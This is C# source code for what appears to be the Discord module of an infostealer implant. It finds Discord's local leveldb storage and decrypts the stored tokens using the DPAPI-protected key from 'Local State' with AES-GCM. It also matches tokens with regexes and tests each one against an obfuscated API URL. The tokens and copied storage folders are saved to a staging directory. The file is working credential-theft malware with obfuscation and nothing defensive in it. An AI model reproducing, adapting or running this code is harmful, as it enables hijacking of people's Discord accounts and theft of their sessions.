using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using deepside;
using deepside.Implant;
using Org.BouncyCastle.Crypto.Parameters;
using Newtonsoft.Json;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Tls;
using Org.BouncyCastle.Pkcs;
using System.Text;
using System.Linq;

namespace spasibozapas
{
    
    internal sealed class Discord
    {
        private static byte[] DecyrptKey(string path)
        {
            dynamic DeserializedFile = JsonConvert.DeserializeObject(File.ReadAllText(path));
            return ProtectedData.Unprotect(Convert.FromBase64String((string)DeserializedFile.os_crypt.encrypted_key).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }
        private static string DecryptToken(byte[] buffer)
        {
            byte[] EncryptedData = buffer.Skip(15).ToArray();
            AeadParameters Params = new AeadParameters(new KeyParameter(DecyrptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local State")), 128, buffer.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new GcmBlockCipher(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        private static Regex TokenRegex = new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}");
        private static Regex BasicRaegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
        private static Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
        private static Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);

        private static Regex[] regexmaths = new Regex[]
        {
            new Regex(@"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"),
            new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled),
            new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled),
            new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled),
        };

        private static string[] DiscordDirectories = new string[] {
            "Discord\\Local Storage\\leveldb",
            "Discord PTB\\Local Storage\\leveldb",
            "Discord Canary\\leveldb",
        };

        // Write tokens
        public static void WriteDiscord(string[] lcDicordTokens, string sSavePath)
        {
            if (lcDicordTokens.Length != 0)
            {
                Directory.CreateDirectory(sSavePath);
                Counter.Discord = true;
                try
                {
                    foreach (string token in lcDicordTokens)
                    {
                        //System.Console.WriteLine("Discordooo--- " + sSavePath);
                        File.AppendAllText(sSavePath + "\\tokens.txt", token + "\n");
                    }   
                } catch  {  }
            } try
            {
                CopyLevelDb(sSavePath);
            } catch { }
        }

        // Copy Local State directory
        private static void CopyLevelDb(string sSavePath)
        {
            foreach (string dir in DiscordDirectories)
            {
                string directory = Path.GetDirectoryName(Path.Combine(Paths.appdata, dir));
                string cpdirectory = Path.Combine(sSavePath,
                    new DirectoryInfo(directory).Name);

                if (!Directory.Exists(directory))
                    continue;
                try
                {
                    Filemanager.CopyDirectory(directory, cpdirectory);
                } catch { }
            }
        }

        // Check token
        private static string TokenState(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString(
                        StringsCrypt.Decrypt(new byte[] { 204, 119, 158, 154, 23, 66, 149, 141, 183, 108, 94, 12, 88, 31, 176, 188, 18, 22, 179, 36, 224, 199, 140, 191, 17, 128, 191, 221, 16, 110, 63, 145, 150, 152, 246, 105, 199, 84, 221, 181, 90, 40, 214, 128, 166, 54, 252, 46, }));
                    return result.Contains("Unauthorized") ? "Token is invalid" : "Token is valid";
                }
            } catch { }
            return "Connection error";
        }

        // Get discord tokens
        public static string[] GetTokens()
        {
           

            List<string> tokens = new List<string>();
            try
            {

                foreach (string dir in DiscordDirectories)
                {
                    string directory = Path.Combine(Paths.appdata, dir);
                    string cpdirectory = Path.Combine(Path.GetTempPath(), new DirectoryInfo(directory).Name);

                    if (!Directory.Exists(directory))
                        continue;

                    //System.Console.WriteLine("\n\n\n" + cpdirectory);
                    //System.Console.WriteLine("\n\n\n" + directory);
                    Filemanager.CopyDirectory(directory, cpdirectory);
                    string token = "";
                    foreach (string file in Directory.GetFiles(cpdirectory))
                    {
                        //System.Console.WriteLine("FILE: " + file);
                        if (!file.EndsWith(".log") && !file.EndsWith(".ldb"))
                            continue;

                        string text = File.ReadAllText(file);
                        Match match = TokenRegex.Match(text);
                        if (match.Success)
                            tokens.Add($"{match.Value} - {TokenState(match.Value)}");
                            //System.Console.WriteLine($"succes1 {match.Value}");

                        Match match2 = BasicRaegex.Match(text);
                        if(match2.Success)
                            tokens.Add($"{match2.Value} - {TokenState(match2.Value)}");
                            //System.Console.WriteLine($"succes2 {match2.Value}");

                        Match match3 = NewRegex.Match(text);
                        if (match3.Success)
                            tokens.Add($"{match3.Value} - {TokenState(match3.Value)}");
                            //System.Console.WriteLine($"succes3 {match3.Value}");

                        Match match4 = EncryptedRegex.Match(text);
                        if (match4.Success)
                            token = DecryptToken(Convert.FromBase64String(match4.Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]));
                            tokens.Add($"{token} - {TokenState(token)}");
                            //System.Console.WriteLine($"succes4 {match4.Value} "); 

                        //foreach(var tokenrege  in regexmaths)
                        //{
                        //    Match match = tokenrege.Match(text);
                        //    if(match.Success)
                        //        tokens.Add($"{match.Value} - {TokenState(match.Value)}");
                        //}
                    }

                    Filemanager.RecursiveDelete(cpdirectory);

                }
            }
            catch { }
            return tokens.ToArray();
        }

    }
}
